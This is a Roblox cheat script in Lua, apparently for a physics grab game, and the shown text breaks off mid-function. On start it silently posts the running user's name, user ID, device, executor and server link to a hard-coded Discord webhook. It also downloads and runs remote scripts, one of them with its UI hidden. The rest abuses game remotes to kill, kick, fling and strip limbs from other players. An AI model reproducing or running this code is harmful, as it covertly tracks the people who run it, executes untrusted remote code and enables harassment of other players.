 Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
 
if game.PlaceId ~= 6961824067 then return end
 
 G = game:GetService("ReplicatedStorage"):WaitForChild("GrabEvents")
G:WaitForChild("EndGrabEarly"):Destroy()
Instance.new("RemoteEvent", G).Name = "EndGrabEarly"
 
 webhookUrl = "https://discord.com/api/webhooks/1476105796705194005/A8UR_tTau9i7BQUx_cNxbTnLoHf4f6TD7gAg9vb5wM3XJjnT2clN-1YohbGFK_1eUSdo"
 
 function sendToDiscord()
    local player = game.Players.LocalPlayer
    local uis = game:GetService("UserInputService")
 
    local platform = "PC"
    local platformEmoji = "🖥️"
 
    if uis.TouchEnabled and not uis.KeyboardEnabled then
        platform = "Mobile"
        platformEmoji = "📱"
    elseif uis.GamepadEnabled then
        platform = "Console"
        platformEmoji = "🎮"
    end
 
    local executor = "Unknown"
    local requestFunc = nil
 
    if syn and syn.request then
        requestFunc = syn.request
        executor = "Synapse X"
    elseif delta and delta.request then
        requestFunc = delta.request
        executor = "delat"
    elseif http_request then
        requestFunc = http_request
        executor = "HTTP_Request"
    elseif request then
        requestFunc = request
        executor = "Request"
    elseif xeno then
        requestFunc = xeno.request
        executor = "xeno"
    elseif is_sirhia then
        executor = "Sirius"
    elseif identifyexecutor then
        local success, result = pcall(identifyexecutor)
        if success then executor = result end
    end
 
    local serverLink = "https://www.roblox.com/share?type=server&id=" .. game.JobId .. "&placeId=" .. game.PlaceId
 
    local contentMessage = string.format(
        "🚀 **New execution detected!**\n👤 **%s** `(@%s)`\n📱 Device: %s %s\n⚡ Executor: %s\n🔗 **Server join:** %s",
        player.DisplayName,
        player.Name,
        platformEmoji,
        platform,
        executor,
        serverLink
    )
 
    local data = {
        ["content"] = contentMessage,
        ["embeds"] = {{
            ["title"] = "📊 Additional Info",
            ["color"] = 16711680,
            ["fields"] = {
                {
                    ["name"] = "🆔 User ID",
                    ["value"] = "```" .. tostring(player.UserId) .. "```",
                    ["inline"] = true
                },
                {
                    ["name"] = "🎮 Game ID",
                    ["value"] = "```" .. tostring(game.PlaceId) .. "```",
                    ["inline"] = true
                }
            },
            ["footer"] = {
                ["text"] = "Script Logger v3.3"
            },
            ["timestamp"] = DateTime.now():ToIsoDate()
        }}
    }
 
    if requestFunc then
        pcall(function()
            requestFunc({
                Url = webhookUrl,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = game:GetService("HttpService"):JSONEncode(data)
            })
        end)
    end
end
 
sendToDiscord()
 
-- =============================================
-- [ Key System ]
-- =============================================
local Window = Rayfield:CreateWindow({
    Name = "FTAP | Sword",
    LoadingTitle = "Creator:GSM_dooogeom",
    ConfigurationSaving = { Enabled = false },
    KeySystem = true,
    KeySettings = {
        Title = "🔑 Key Authentication",
        Subtitle = "Enter key",
        Note = "Discord: https://discord.gg/773fTV9AwN",
        Key = {"DogeomScript"},
        Actions = {
            [1] = {
                Text = "Copy Discord link",
                OnPress = function()
                    setclipboard('https://discord.gg/773fTV9AwN')
                    Rayfield:Notify({
                        Title = "✅ Copy complete",
                        Content = "Discord link copied",
                        Duration = 2
                    })
                end,
            },
        },
        GrabKeyFromSite = false,
        SaveKey = false,
        FileName = "FTAP_Key",
    },
    ToggleUIKeybind = Enum.KeyCode.T,
})
 
-- =============================================
-- [ External Script Load ]
-- =============================================

pcall(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/lags82250-hash/LAXSCIRPTV1/refs/heads/main/LAXFTAP"))()
end)
 
pcall(function()
    loadstring(game:HttpGet('https://cdn.jsdelivr.net/gh/EdgeIY/infiniteyield@master/source'))()
    task.wait(1)
    if _G and _G.ToggleUI then
        _G.ToggleUI = false
    end
    print("✅ Infinite Yield loaded (UI hidden)")
end)
 
-- =============================================
-- [ Keep Rayfield UI on top ]
-- =============================================
 function bringRayfieldToFront()
    task.spawn(function()
        while task.wait(0.5) do
            for _, gui in ipairs(game:GetService("CoreGui"):GetChildren()) do
                if gui:IsA("ScreenGui") and (gui.Name:find("Rayfield") or gui.Name:find("RayField")) then
                    gui.DisplayOrder = 999999
                    for _, child in ipairs(gui:GetDescendants()) do
                        if child:IsA("Frame") or child:IsA("ScrollingFrame") or child:IsA("TextButton") then
                            child.ZIndex = 999999
                        end
                    end
                end
            end
        end
    end)
end
bringRayfieldToFront()
 
-- =============================================
-- [ PC TP function (Z key) ]
-- =============================================
 UserInputService = game:GetService("UserInputService")
 
 function LookTeleport()
    local cam = workspace.CurrentCamera
    local char = game.Players.LocalPlayer.Character
    local hrp = char and char:FindFirstChild("HumanoidRootPart")
 
    if hrp and cam then
        local rayOrigin = cam.CFrame.Position
        local rayDirection = cam.CFrame.LookVector * 1000
        local raycastParams = RaycastParams.new()
        raycastParams.FilterType = Enum.RaycastFilterType.Blacklist
        raycastParams.FilterDescendantsInstances = {char}
 
        local raycastResult = workspace:Raycast(rayOrigin, rayDirection, raycastParams)
 
        local targetPos
        if raycastResult then
            targetPos = raycastResult.Position + Vector3.new(0, 3, 0)
        else
            targetPos = rayOrigin + (rayDirection * 0.5)
        end
 
        hrp.CFrame = CFrame.new(targetPos)
        return true
    end
    return false
end
 
UserInputService.InputBegan:Connect(function(input, gameProcessed)
    if gameProcessed then return end
    if input.KeyCode == Enum.KeyCode.Z then
        LookTeleport()
    end
end)
 
-- =============================================
-- [ Circular TP button (mobile) ]
-- =============================================
 function createTPButton()
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "TPButton"
    screenGui.Parent = game:GetService("CoreGui")
    screenGui.DisplayOrder = 999998
 
    local button = Instance.new("TextButton")
    button.Size = UDim2.new(0, 70, 0, 70)
    button.Position = UDim2.new(0.5, -35, 0.9, -35)
    button.Text = "📍"
    button.BackgroundColor3 = Color3.fromRGB(0, 150, 255)
    button.TextColor3 = Color3.new(1, 1, 1)
    button.Font = Enum.Font.GothamBold
    button.TextSize = 35
    button.Parent = screenGui
 
    local circle = Instance.new("UICorner", button)
    circle.CornerRadius = UDim.new(1, 0)
 
    local shadow = Instance.new("ImageLabel")
    shadow.Size = UDim2.new(1, 8, 1, 8)
    shadow.Position = UDim2.new(0, -4, 0, 4)
    shadow.BackgroundTransparency = 1
    shadow.Image = "rbxasset://textures/ui/White/White_9slice_center.png"
    shadow.ImageColor3 = Color3.fromRGB(0, 0, 0)
    shadow.ImageTransparency = 0.6
    shadow.ZIndex = -1
    shadow.Parent = button
 
    button.MouseButton1Click:Connect(LookTeleport)
 
    local dragging = false
    local dragStart
    local startPos
 
    button.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.Touch then
            dragging = true
            dragStart = input.Position
            startPos = button.Position
        end
    end)
 
    button.InputChanged:Connect(function(input)
        if dragging and input.UserInputType == Enum.UserInputType.Touch then
            local delta = input.Position - dragStart
            button.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
        end
    end)
 
    button.InputEnded:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.Touch then
            dragging = false
        end
    end)
end
 
-- =============================================
-- [ Service load ]
-- =============================================
 Players = game:GetService("Players")
 RunService = game:GetService("RunService")
 ReplicatedStorage = game:GetService("ReplicatedStorage")
 Workspace = game:GetService("Workspace")
 
 plr = Players.LocalPlayer
 rs = ReplicatedStorage
 inv = Workspace:FindFirstChild(plr.Name.."SpawnedInToys") or Workspace:FindFirstChild("SpawnedInToys")
 Plots = Workspace:WaitForChild("Plots")
 
-- =============================================
-- [ Find remote events ]
-- =============================================
 GrabEvents = rs:FindFirstChild("GrabEvents")
 CharacterEvents = rs:FindFirstChild("CharacterEvents")
 PlayerEvents = rs:FindFirstChild("PlayerEvents")
 MenuToys = rs:FindFirstChild("MenuToys")
 BombEvents = rs:FindFirstChild("BombEvents")
 
 SetNetworkOwner = GrabEvents and (GrabEvents:FindFirstChild("SetNetworkOwner") or GrabEvents:FindFirstChild("SetOwner"))
 DestroyGrabLine = GrabEvents and (GrabEvents:FindFirstChild("DestroyGrabLine") or GrabEvents:FindFirstChild("DestroyLine"))
 CreateGrabLine = GrabEvents and (GrabEvents:FindFirstChild("CreateGrabLine") or GrabEvents:FindFirstChild("CreateGrab"))
 ExtendGrabLine = GrabEvents and (GrabEvents:FindFirstChild("ExtendGrabLine") or GrabEvents:FindFirstChild("ExtendGrab"))
 Struggle = CharacterEvents and (CharacterEvents:FindFirstChild("Struggle") or CharacterEvents:FindFirstChild("StruggleRemote"))
 RagdollRemote = CharacterEvents and (CharacterEvents:FindFirstChild("RagdollRemote") or CharacterEvents:FindFirstChild("Ragdoll"))
 SpawnToyRemote = MenuToys and (MenuToys:FindFirstChild("SpawnToyRemoteFunction") or MenuToys:FindFirstChild("SpawnToy"))
 DestroyToy = MenuToys and (MenuToys:FindFirstChild("DestroyToy") or MenuToys:FindFirstChild("DestroyToyRemote"))
 StickyPartEvent = PlayerEvents and (PlayerEvents:FindFirstChild("StickyPartEvent") or PlayerEvents:FindFirstChild("StickyPart"))
 BombExplode = BombEvents and (BombEvents:FindFirstChild("BombExplode") or BombEvents:FindFirstChild("Explode"))
 
-- =============================================
-- [ Autocomplete function ]
-- =============================================
 function findPlayerByPartialName(partial)
    if not partial or partial == "" then return nil end
    partial = partial:lower()
    for _, player in ipairs(Players:GetPlayers()) do
        if player ~= plr then
            if player.Name:lower():find(partial) or player.DisplayName:lower():find(partial) then
                return player
            end
        end
    end
    return nil
end
 
-- =============================================
-- [ Teleport function ]
-- =============================================
 function TP(target)
    local TCHAR = target.Character
    local THRP = TCHAR and (TCHAR:FindFirstChild("Torso") or TCHAR:FindFirstChild("HumanoidRootPart"))
    local localChar = plr.Character
    local localHRP = localChar and localChar:FindFirstChild("HumanoidRootPart")
 
    if TCHAR and THRP and localHRP then
        local ping = plr:GetNetworkPing()
        local offset = THRP.Position + (THRP.Velocity * (ping + 0.15))
        localHRP.CFrame = CFrame.new(offset) * THRP.CFrame.Rotation
        return true
    end
    return false
end
 
-- =============================================
-- [ Anti-kick (Anti-PCLD) function ]
-- =============================================
 AntiPCLDEnabled = false
 
 function AntiPCLD()
    if not AntiPCLDEnabled then return end
 
    local char = plr.Character
    if not char then return end
 
    local torso = char:FindFirstChild("Torso")
    if not torso then return end
 
    local CF = torso.CFrame
    torso.CFrame = CFrame.new(0,-99,9999)
    task.wait(0.15)
 
    local humanoid = char:FindFirstChild("Humanoid")
    if humanoid then
        humanoid:ChangeState(Enum.HumanoidStateType.Dead)
    end
 
    local newChar = plr.CharacterAdded:Wait()
    newChar:WaitForChild("Humanoid"):ChangeState(Enum.HumanoidStateType.Dead)
    local newTorso = newChar:WaitForChild("Torso")
    if newTorso then
        newTorso.CFrame = CF
    end
end
 
 function setupAntiPCLD()
    task.spawn(function()
        while AntiPCLDEnabled do
            for _, obj in ipairs(Workspace:GetChildren()) do
                if obj.Name == "PlayerCharacterLocationDetector" and obj:IsA("BasePart") then
                    if plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
                        local hrp = plr.Character.HumanoidRootPart
                        local dist = (obj.Position - hrp.Position).Magnitude
                        if dist < 10 then
                            AntiPCLD()
                            break
                        end
                    end
                end
            end
            task.wait(0.5)
        end
    end)
end
 
-- =============================================
-- [ Anti Sticky Aura function ]
-- =============================================
 AntiStickyAuraT = false
 AntiStickyAuraThread = nil
 
 function AntiStickyAuraF()
    if AntiStickyAuraThread then
        task.cancel(AntiStickyAuraThread)
        AntiStickyAuraThread = nil
    end
 
    if not AntiStickyAuraT then return end
 
     targetNames = { 
        "NinjaKunai", "NinjaShuriken", "NinjaKatana", 
        "ToolCleaver", "ToolDiggingForkRusty", 
        "ToolPencil", "ToolPickaxe" 
    }
 
    AntiStickyAuraThread = task.spawn(function()
        while AntiStickyAuraT do
            local character = plr.Character
            if character then
                local hrp = character:FindFirstChild("HumanoidRootPart")
                if hrp then
                    for _, folder in ipairs(Workspace:GetChildren()) do
                        if folder:IsA("Folder") and folder.Name:match("SpawnedInToys$") and folder.Name ~= (plr.Name .. "SpawnedInToys") then
                            for _, item in ipairs(folder:GetChildren()) do
                                for _, targetName in ipairs(targetNames) do
                                    if item.Name == targetName and item:FindFirstChild("StickyPart") then
                                        local sticky = item.StickyPart
                                        local basePart = item.PrimaryPart or sticky
                                        local dist = (basePart.Position - hrp.Position).Magnitude
                                        if dist <= 30 and SetNetworkOwner then
                                            pcall(function() SetNetworkOwner:FireServer(sticky, sticky.CFrame) end)
                                        end
                                    end
                                end
                            end
                        end
                    end
                end
            end
            task.wait(0.03)
        end
    end)
end
 
-- =============================================
-- [ Anti-burn ]
-- =============================================
 AntiBurnV = false
 AntiBurnThread = nil
 
 function AntiBurn()
    if AntiBurnThread then
        task.cancel(AntiBurnThread)
        AntiBurnThread = nil
    end
 
    if not AntiBurnV then return end
 
    AntiBurnThread = task.spawn(function()
        local EP = workspace:WaitForChild("Map"):WaitForChild("Hole"):WaitForChild("PoisonSmallHole"):WaitForChild("ExtinguishPart")
 
        while AntiBurnV do
            local hrp = plr.Character and plr.Character:FindFirstChild("Head")
            if hrp then
                EP.Transparency = 1
                EP.CastShadow = false
                if EP:FindFirstChild("Tex") then
                    EP.Tex.Transparency = 1
                end
                EP.Size = Vector3.new(0, 0, 0)
                EP.CFrame = hrp.CFrame
                task.wait()
                EP.CFrame = hrp.CFrame * CFrame.new(0, 3, 0)
            end
            task.wait()
        end
    end)
end
 
-- =============================================
-- [ Anti-paint ]
-- =============================================
 AntiPaintT = false
 AntiPaintThread = nil
 
 function AntiPaintF()
    if AntiPaintThread then
        task.cancel(AntiPaintThread)
        AntiPaintThread = nil
    end
 
    if not AntiPaintT then return end
 
    AntiPaintThread = task.spawn(function()
        while AntiPaintT do
            local char = plr.Character
            if char then
                local parts = {
                    "Head",
                    "HumanoidRootPart",
                    "Torso",
                    "Left Arm",
                    "Right Arm",
                    "Left Leg",
                    "Right Leg"
                }
                for _, partName in ipairs(parts) do
                    local part = char:FindFirstChild(partName)
                    if part and part:IsA("BasePart") then
                        part.CanTouch = false
                    end
                end
            end
            task.wait(0.1)
        end
    end)
end
 
-- =============================================
-- [ Anti-explosion ]
-- =============================================
 AntiExplosionT = false
 AntiExplosionC = nil
 
 function AntiExplosionF()
    if AntiExplosionC then
        AntiExplosionC:Disconnect()
        AntiExplosionC = nil
    end
 
    if not AntiExplosionT then return end
 
    local char = plr.Character
    if not char then return end
 
    local hrp = char:WaitForChild("HumanoidRootPart")
    local hum = char:WaitForChild("Humanoid")
 
    AntiExplosionC = Workspace.ChildAdded:Connect(function(model)
        if not char or not hrp or not hum or not AntiExplosionT then return end
        if model:IsA("BasePart") and (model.Position - hrp.Position).Magnitude <= 25 then
            hrp.Anchored = true
            task.wait(0.05)
            hrp.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
            hrp.Anchored = false
        end
    end)
end
 
-- =============================================
-- [ KillGrab variables ]
-- =============================================
 KillGrabEnabled = false
 KillGrabConnection = nil
 
 function KillGrabF()
    if KillGrabConnection then
        KillGrabConnection:Disconnect()
        KillGrabConnection = nil
    end
 
    if not KillGrabEnabled then return end
 
    KillGrabConnection = RunService.Heartbeat:Connect(function()
        local grabParts = workspace:FindFirstChild("GrabParts")
        if not grabParts then return end
 
        for _, grabPart in ipairs(grabParts:GetChildren()) do
            if grabPart.Name ~= "GrabPart" then continue end
 
            local weldConstraint = grabPart:FindFirstChildOfClass("WeldConstraint")
            if not weldConstraint or not weldConstraint.Part1 then continue end
 
            local target = weldConstraint.Part1
            if not target or not target.Parent then continue end
 
            local targetPlayer = Players:FindFirstChild(target.Parent.Name)
            if not targetPlayer then continue end
 
            local targetChar = targetPlayer.Character
            if not targetChar then continue end
 
            local THRP = targetChar:FindFirstChild("HumanoidRootPart")
            local THum = targetChar:FindFirstChildOfClass("Humanoid")
 
            if not THRP or not THum then continue end
            if THum.Health <= 0 then continue end
 
            local char = plr.Character
            if not char then continue end
 
            local myTorso = char:FindFirstChild("HumanoidRootPart")
            if not myTorso then continue end
 
            if (myTorso.Position - target.Position).Magnitude > 30 then continue end
 
            pcall(function()
                if SetNetworkOwner then
                    SetNetworkOwner:FireServer(THRP, myTorso.CFrame)
                end
 
                local FallenY = workspace.FallenPartsDestroyHeight
                local targetY = (FallenY <= -50000 and -49999) or (FallenY <= -100 and -99) or -100
                THRP.CFrame = CFrame.new(9999, targetY, 9999)
            end)
        end
    end)
end
 
-- =============================================
-- [ KickGrab variables ]
-- =============================================
local KickGrabState = {
    Looping = false,
    AutoRagdoll = false,
    Mode = "Camera",
    DetentionDist = 19,
    SnowBallLooping = false
}
 
local kickGrabTargetList = {}
 
getgenv().LoopGrabActive = false
 
-- =============================================
-- [ LoopGrab variables ]
-- =============================================
local LoopGrabActive = false
local LoopGrabThread = nil
local LoopGrabTarget = nil
local LoopSetOwnerCount = 0
 
-- =============================================
-- [ KickGrab utility function ]
-- =============================================
local function GetPallet()
    for _, child in pairs(Workspace:GetChildren()) do
        if child.Name:find(plr.Name) and child.Name:find("SpawnedInToys") then
            local pallet = child:FindFirstChild("PalletLightBrown")
            if pallet then 
                return pallet:FindFirstChild("SoundPart") 
            end
        end
    end
    return nil
end
 
-- =============================================
-- [ KickGrab main loop ]
-- =============================================
local function ExecuteKickGrabLoop()
    local lastStrikeTime = tick() 
    local lastSpawnTime = 0 
    local currentPalletRef = nil
    local isPalletOwned = false
    local frameToggle = true
    local currentTargetIndex = 1
 
    while KickGrabState.Looping do
        if #kickGrabTargetList == 0 then
            break
        end
 
        if currentTargetIndex > #kickGrabTargetList then
            currentTargetIndex = 1
        end
 
        local targetName = kickGrabTargetList[currentTargetIndex]
        local target = Players:FindFirstChild(targetName)
 
        if not target then
            currentTargetIndex = currentTargetIndex + 1
            task.wait()
            continue
        end
 
        local myChar = plr.Character
        local targetChar = target.Character
        local myHrp = myChar and myChar:FindFirstChild("HumanoidRootPart")
 
        local targetHrp = targetChar and targetChar:FindFirstChild("HumanoidRootPart")
        local targetBody = targetChar and (targetChar:FindFirstChild("Torso") or targetChar:FindFirstChild("UpperTorso"))
        local cam = Workspace.CurrentCamera 
 
        if myHrp and targetHrp and cam then
            local rOwner = SetNetworkOwner
            local rDestroy = DestroyGrabLine
            local rSpawn = SpawnToyRemote
 
            local distance = (myHrp.Position - targetHrp.Position).Magnitude
 
            if distance > 30 then
                local ping = plr:GetNetworkPing()
                local offset = targetHrp.Position + (targetHrp.Velocity * (ping + 0.15))
                myHrp.CFrame = CFrame.new(offset) * targetHrp.CFrame.Rotation
                task.wait(0.1)
            end
 
            if rOwner then
                rOwner:FireServer(targetHrp, targetHrp.CFrame)
                if targetBody then
                    rOwner:FireServer(targetBody, targetBody.CFrame)
                end
            end
 
            local detentionPos
            if KickGrabState.Mode == "Up" then 
                detentionPos = myHrp.CFrame * CFrame.new(0, 18, 0)
            elseif KickGrabState.Mode == "Down" then 
                detentionPos = myHrp.CFrame * CFrame.new(0, -10, 0)
            else 
                detentionPos = cam.CFrame * CFrame.new(0, 0, -KickGrabState.DetentionDist)
            end
 
            if rOwner and rDestroy then
                if frameToggle then
                    rOwner:FireServer(targetHrp, detentionPos)
                    targetHrp.CFrame = detentionPos
                    targetHrp.AssemblyLinearVelocity = Vector3.zero
                    if targetBody then
                        rOwner:FireServer(targetBody, detentionPos)
                        targetBody.CFrame = detentionPos
                        targetBody.AssemblyLinearVelocity = Vector3.zero
                    end
                else
                    rDestroy:FireServer(targetHrp)
                    if targetBody then rDestroy:FireServer(targetBody) end
                end
                frameToggle = not frameToggle
            end
 
            if KickGrabState.AutoRagdoll then
                local pallet = GetPallet()
                if not pallet and (tick() - lastSpawnTime > 3.0) then
                    lastSpawnTime = tick()
                    if rSpawn then 
                        task.spawn(function() 
                            rSpawn:InvokeServer("PalletLightBrown") 
                        end) 
                    end
                end
 
                if pallet ~= currentPalletRef then 
                    currentPalletRef = pallet 
                    isPalletOwned = false 
                end
 
                if pallet then
                    if not isPalletOwned then
                        if CreateGrabLine then CreateGrabLine:FireServer(pallet, pallet.CFrame) end
                        if ExtendGrabLine then ExtendGrabLine:FireServer(25) end
                        if rOwner then rOwner:FireServer(pallet, pallet.CFrame) end
                        isPalletOwned = true
                        task.wait(0.1) 
                    else
                        local currentTime = tick()
                        local timeSinceStrike = currentTime - lastStrikeTime
                        if timeSinceStrike > 2.0 then
                            pallet.AssemblyLinearVelocity = Vector3.new(0, 400, 0)
                            pallet.AssemblyAngularVelocity = Vector3.new(1000, 1000, 1000)
                            if timeSinceStrike > 2.15 then lastStrikeTime = currentTime end
                        end
                        pallet.CFrame = targetHrp.CFrame * CFrame.new(0, 50, 0)
                    end
                end
            end
 
            currentTargetIndex = currentTargetIndex + 1
        end
        RunService.Heartbeat:Wait()
    end
end
 
-- =============================================
-- [ Modified LoopGrab function ]
-- =============================================
local function LoopGrabToggle(Value)
    if Value then
        if getgenv().LoopGrabActive then
            game.StarterGui:SetCore("SendNotification", {
                Title = "Loop Grab",
                Text = "Already on!",
                Duration = 3
            })
            return
        end
 
        getgenv().LoopGrabActive = true
        game.StarterGui:SetCore("SendNotification", {
            Title = "Loop Grab",
            Text = "Loop Grab is on.",
            Duration = 3
        })
 
        task.spawn(function()
            while getgenv().LoopGrabActive do
                local grabParts = workspace:FindFirstChild("GrabParts")
                if not grabParts then
                    task.wait()
                    continue
                end
 
                local gp = grabParts:FindFirstChild("GrabPart")
                local weld = gp and gp:FindFirstChildOfClass("WeldConstraint")
                local part1 = weld and weld.Part1
 
                if part1 then
                    local ownerPlayer = nil
                    for _, pl in ipairs(game.Players:GetPlayers()) do
                        if pl.Character and part1:IsDescendantOf(pl.Character) then
                            ownerPlayer = pl
                            break
                        end
                    end
 
                    while getgenv().LoopGrabActive and workspace:FindFirstChild("GrabParts") do
                        if ownerPlayer then
                            local tgtTorso = ownerPlayer.Character and ownerPlayer.Character:FindFirstChild("HumanoidRootPart") 
                            local tgtHead = ownerPlayer.Character and ownerPlayer.Character:FindFirstChild("Head")
                            local myTorso = game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart") 
 
                            if tgtTorso and myTorso and tgtHead then
                                pcall(function()
                                    SetNetworkOwner:FireServer(tgtTorso, CFrame.lookAt(myTorso.Position, tgtTorso.Position))
                                end)
                            end
                        else
                            if part1.Parent then
                                local myTorso = game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
                                if myTorso then
                                    pcall(function()
                                        SetNetworkOwner:FireServer(part1, CFrame.lookAt(myTorso.Position, part1.Position))
                                    end)
                                end
                            end
                        end
                        task.wait()
                    end
                end
                task.wait()
            end
        end)
    else
        if not getgenv().LoopGrabActive then
            game.StarterGui:SetCore("SendNotification", {
                Title = "Loop Grab",
                Text = "Already off!",
                Duration = 3
            })
            return
        end
 
        getgenv().LoopGrabActive = false
        game.StarterGui:SetCore("SendNotification", {
            Title = "Loop Grab",
            Text = "Loop Grab is off.",
            Duration = 3
        })
    end
end
 
-- =============================================
-- [ Snowball loop function ]
-- =============================================
local function ExecuteSnowballLoop()
    local currentTargetIndex = 1
 
    while KickGrabState.SnowBallLooping do
        if #kickGrabTargetList == 0 then
            break
        end
 
        if currentTargetIndex > #kickGrabTargetList then
            currentTargetIndex = 1
        end
 
        local targetName = kickGrabTargetList[currentTargetIndex]
        local target = Players:FindFirstChild(targetName)
 
        if target and target.Character then
            local myHrp = plr.Character and plr.Character:FindFirstChild("HumanoidRootPart")
            local targetHrp = target.Character:FindFirstChild("HumanoidRootPart")
 
            if myHrp and targetHrp and SpawnToyRemote and SetNetworkOwner and BombExplode then
                task.spawn(function()
                    SpawnToyRemote:InvokeServer("BallSnowball", myHrp.CFrame * CFrame.new(0, 10, 20), Vector3.new(0, 0, 0))
                end)
 
                task.wait(0.15)
 
                local invName = plr.Name .. "SpawnedInToys"
                local inv = Workspace:FindFirstChild(invName)
                local ballPart = inv and inv:FindFirstChild("BallSnowball")
                local ballSPart = ballPart and ballPart:FindFirstChild("SoundPart")
 
                if ballPart and ballSPart then
                    SetNetworkOwner:FireServer(ballSPart, ballSPart.CFrame)
                    ballSPart.CFrame = targetHrp.CFrame
                    BombExplode:FireServer({
                        Radius = 0, 
                        Color = Color3.new(0, 0, 0), 
                        TimeLength = 0, 
                        Model = ballPart, 
                        Type = "SnowPoof", 
                        ExplodesByFire = false, 
                        MaxForcePerStudSquared = 0, 
                        Hitbox = ballSPart, 
                        ImpactSpeed = 0, 
                        ExplodesByPointy = false, 
                        DestroysModel = true, 
                        PositionPart = ballSPart
                    }, Vector3.new(0, 0, 0))
                end
 
                currentTargetIndex = currentTargetIndex + 1
            end
        else
            currentTargetIndex = currentTargetIndex + 1
        end
        task.wait(0.15)
    end
end
 
-- =============================================
-- [ Target limb removal function ]
-- =============================================
local selectedDeletePart = "Arm/Leg"
 
local function teleportParts(player, partName)
    local character = player.Character
    if not character then return end
 
    local targetParts = {}
 
    if partName == "Arm/Leg" then
        targetParts = {
            character:FindFirstChild("Left Leg"),
            character:FindFirstChild("Right Leg"),
            character:FindFirstChild("Left Arm"),
            character:FindFirstChild("Right Arm")
        }
    elseif partName == "Legs" then
        targetParts = {
            character:FindFirstChild("Left Leg"),
            character:FindFirstChild("Right Leg")
        }
    elseif partName == "Arms" then
        targetParts = {
            character:FindFirstChild("Left Arm"),
            character:FindFirstChild("Right Arm")
        }
    end
 
    if RagdollRemote then
        local hrp = character:FindFirstChild("HumanoidRootPart")
        if hrp then
            pcall(function() RagdollRemote:FireServer(hrp, 1) end)
        end
    end
 
    task.wait(0.3)
    for _, part in ipairs(targetParts) do
        if part then
            part.CFrame = CFrame.new(0, -99999, 0)
        end
    end
    task.wait(0.3)
 
    local torso = character:FindFirstChild("Torso")
    if torso then
        torso.CFrame = CFrame.new(0, -99999, 0)
    end
end
 
-- =============================================
-- [ Find closest player ]
-- =============================================
local function getClosestPlayer(targetPart)
    local closest, distance = nil, math.huge
    for _, player in pairs(Players:GetPlayers()) do
        if player ~= plr and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
            local mag = (targetPart.Position - player.Character.HumanoidRootPart.Position).Magnitude
            if mag < distance then
                distance = mag
                closest = player
            end
        end
    end
    return closest
end
 
-- =============================================
-- [ LoopGrab function (getgenv version) ]
-- =============================================
local function startLoopGrab()
    if getgenv().LoopGrabActive then
        Rayfield:Notify({
            Title = "🔄 Loop Grab",
            Content = "Already on!",
            Duration = 2
        })
        return false
    end
 
    getgenv().LoopGrabActive = true
 
    Rayfield:Notify({
        Title = "🔄 Loop Grab",
        Content = "Loop Grab is on.",
        Duration = 2
    })
 
    task.spawn(function()
        while getgenv().LoopGrabActive do
            local grabParts = workspace:FindFirstChild("GrabParts")
            if not grabParts then
                task.wait()
                continue
            end
 
            local gp = grabParts:FindFirstChild("GrabPart")
            local weld = gp and gp:FindFirstChildOfClass("WeldConstraint")
            local part1 = weld and weld.Part1
 
            if part1 then
                local ownerPlayer = nil
                for _, pl in ipairs(Players:GetPlayers()) do
                    if pl.Character and part1:IsDescendantOf(pl.Character) then
                        ownerPlayer = pl
                        break
                    end
                end
 
                while getgenv().LoopGrabActive and workspace:FindFirstChild("GrabParts") do
                    if ownerPlayer then
                        local tgtTorso = ownerPlayer.Character and ownerPlayer.Character:FindFirstChild("HumanoidRootPart") 
                        local tgtHead = ownerPlayer.Character and ownerPlayer.Character:FindFirstChild("Head")
                        local myTorso = plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") 
 
                        if tgtTorso and myTorso and tgtHead then
                            pcall(function()
                                SetNetworkOwner:FireServer(tgtTorso, CFrame.lookAt(myTorso.Position, tgtTorso.Position))
                            end)
                        end
                    else
                        if part1.Parent then
                            local myTorso = plr.Character and plr.Character:FindFirstChild("HumanoidRootPart")
                            if myTorso then
                                pcall(function()
                                    SetNetworkOwner:FireServer(part1, CFrame.lookAt(myTorso.Position, part1.Position))
                                end)
                            end
                        end
                    end
                    task.wait()
                end
            end
            task.wait()
        end
    end)
 
    return true
end
 
local function stopLoopGrab()
    if not getgenv().LoopGrabActive then
        Rayfield:Notify({
            Title = "🔄 Loop Grab",
            Content = "Already off!",
            Duration = 2
        })
        return
    end
 
    getgenv().LoopGrabActive = false
    Rayfield:Notify({
        Title = "🔄 Loop Grab",
        Content = "Loop Grab is off.",
        Duration = 2
    })
end
 
-- =============================================
-- [ Blob variables ]
-- =============================================
local playersInLoop1V = {}
local currentBlobS = nil
local blobmanInstanceS = nil
local sitJumpT = false
local AutoGucciT = false
local ragdollLoopD = false
local blobLoopT = false
local blobLoopT3 = false
local blobKillThread = nil
local blobKickThread = nil
local antiMasslessEnabled = false
local antiMasslessThread = nil
local PPs = Workspace:FindFirstChild("PlotItems") and Workspace.PlotItems:FindFirstChild("PlayersInPlots")
 
-- =============================================
-- [ Blob functions ]
-- =============================================
local function UpdateCurrentBlobman()
    local char = plr.Character
    local hrp = char and char:FindFirstChild("HumanoidRootPart")
    if not hrp then return end
 
    for _, blobs in Workspace:GetDescendants() do
        if blobs.Name ~= "CreatureBlobman" then continue end
        local seat = blobs:FindFirstChild("VehicleSeat")
        if not seat then continue end
        local weld = seat:FindFirstChild("SeatWeld")
        if not weld then continue end
        if weld.Part1 == hrp then
            currentBlobS = blobs
            break
        end
    end
end
 
local function spawnBlobmanF()
    local char = plr.Character
    local hrp = char and char:FindFirstChild("HumanoidRootPart")
    if not hrp then return end
 
    local blob = inv and inv:FindFirstChild("CreatureBlobman")
    if blob then
        blobmanInstanceS = blob
        return
    end
 
    if SpawnToyRemote then
        task.spawn(function()
            pcall(function()
                SpawnToyRemote:InvokeServer("CreatureBlobman", hrp.CFrame, Vector3.new(0, 0, 0))
            end)
        end)
 
        local tries = 0
        repeat
